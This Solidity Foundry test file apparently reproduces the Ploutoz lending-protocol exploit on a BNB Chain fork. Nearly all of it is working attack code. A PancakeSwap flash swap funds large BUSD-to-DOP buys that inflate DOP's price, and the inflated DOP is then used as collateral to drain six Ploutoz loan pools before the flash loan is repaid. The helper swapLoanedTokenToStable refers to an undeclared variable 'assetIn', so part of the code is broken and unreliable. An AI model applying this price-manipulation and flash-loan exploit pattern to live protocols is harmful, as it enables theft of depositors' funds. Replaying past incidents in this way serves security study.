// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 365K
// Attacker : https://bscscan.com/address/0x2f618493b9ff77d61426e4dbf3b844666a6b315e
// Attack Contract : https://bscscan.com/address/0xcd8206410b55e278a9538071a69ef9e185856d24
// Vulnerable Contract : https://bscscan.com/address/0x844fa82f1e54824655470970f7004dd90546bb28
// Attack Tx : https://bscscan.com/tx/0x7fe46c2746855dd57e18f4d33522849ff192e4e26c74835799ba8dab89099457

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x844fa82f1e54824655470970f7004dd90546bb28#code

// @Analysis
// Post-mortem : https://x.com/peckshield/status/1463113809111896065
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

interface ILoanToken {
    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes memory data
    ) external payable;

    function loanTokenAddress() external view returns (address);
}

contract Ploutoz is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 12_886_415;

    address internal constant PancakeSwap = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16;
    address internal constant TwindexSwapRouter = 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address internal constant pCAKE = 0x539Ff593840387439196721cB2Ce5a94051DAEB6;
    address internal constant pDOLLY = 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705;
    address internal constant pWETH = 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872;
    address internal constant pBTCB = 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d;
    address internal constant pUSDT = 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117;
    address internal constant pBUSD = 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb;

    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant DOP = 0x844FA82f1E54824655470970F7004Dd90546bB28;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = address(BUSD);

        IERC20(BUSD).approve(TwindexSwapRouter, type(uint256).max);
        IERC20(DOP).approve(TwindexSwapRouter, type(uint256).max);
        IERC20(BUSD).approve(PancakeRouter, type(uint256).max);

        IERC20(DOP).approve(0xc9eaC733e69C7F02B4320f1C2E25a76a770EDfEb, type(uint256).max);
        IERC20(DOP).approve(pBUSD, type(uint256).max);
        IERC20(DOP).approve(pUSDT, type(uint256).max);
        IERC20(DOP).approve(pBTCB, type(uint256).max);
        IERC20(DOP).approve(pWETH, type(uint256).max);
        IERC20(DOP).approve(pDOLLY, type(uint256).max);
        IERC20(DOP).approve(pCAKE, type(uint256).max);
    }

    function testExploit() public balanceLog {
        // vm.startPrank(0xCD8206410b55e278A9538071A69Ef9E185856D24);
        uint256 _amount0Out = 0;
        uint256 _amount1Out = 1_000_400.0 ether;
        IUniswapV2Pair(PancakeSwap).swap(_amount0Out, _amount1Out, address(this), "X");

        swapLoanedTokenToStables();
    }

    function swapLoanedTokenToStables() internal {
        swapLoanedTokenToStable(pCAKE);
        swapLoanedTokenToStable(pDOLLY);
        swapLoanedTokenToStable(pWETH);
        swapLoanedTokenToStable(pBTCB);
        swapLoanedTokenToStable(pUSDT);
    }

    function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) external {
        // vm.startPrank(0xCD8206410b55e278A9538071A69Ef9E185856D24);
        uint256 amountIn;
        uint256 amountOutMin = 0;
        address[] memory path = new address[](2);
        uint256 deadline = block.timestamp;

        amountIn = 1_000_000 ether;
        path[0] = BUSD;
        path[1] = DOP;
        Uni_Router_V2(TwindexSwapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);

        amountIn = 400 ether;
        path[0] = BUSD;
        path[1] = DOP;
        Uni_Router_V2(PancakeRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);

        //Here we borrow the assets
        borrowMultipleLoans();

        amountIn = 570_625_638_619_593_832_545_805;
        path[0] = DOP;
        path[1] = BUSD;
        Uni_Router_V2(TwindexSwapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);

        uint256 amount = 1_002_951.02 ether;
        IERC20(BUSD).transfer(PancakeSwap, amount);
        // vm.stopPrank();
    }

    function borrowMultipleLoans() internal {
        // CAKE loan
        borrowSingleLoan(pCAKE, 85 ether, 50 ether);

        // DOLLY loan
        borrowSingleLoan(pDOLLY, 18_000 ether, 500.0 ether);

        // WETH loan
        borrowSingleLoan(pWETH, 18 ether, 1900 ether);

        // BTCB loan
        borrowSingleLoan(pBTCB, 1.6 ether, 2000 ether);

        // USDT loan
        borrowSingleLoan(pUSDT, 89_000 ether, 2000 ether);

        // BUSD loan
        borrowSingleLoan(pBUSD, 90_000 ether, 2000 ether);
    }

    function swapLoanedTokenToStable(address lToken) internal {
        uint256 amountIn = TokenHelper.getTokenBalance(assetIn, address(this));
        address[] memory path = new address[](2);
        path[0] = ILoanToken(lToken).loanTokenAddress();
        path[1] = BUSD;
        IERC20(assetIn).approve(PancakeRouter, type(uint256).max);
        Uni_Router_V2(PancakeRouter).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function borrowSingleLoan(address token, uint256 withdrawAmount, uint256 collateralTokenSent) internal {
        ILoanToken(token).borrow(
            bytes32(0), withdrawAmount, 7200, collateralTokenSent, DOP, address(this), address(this), ""
        );
    }
}
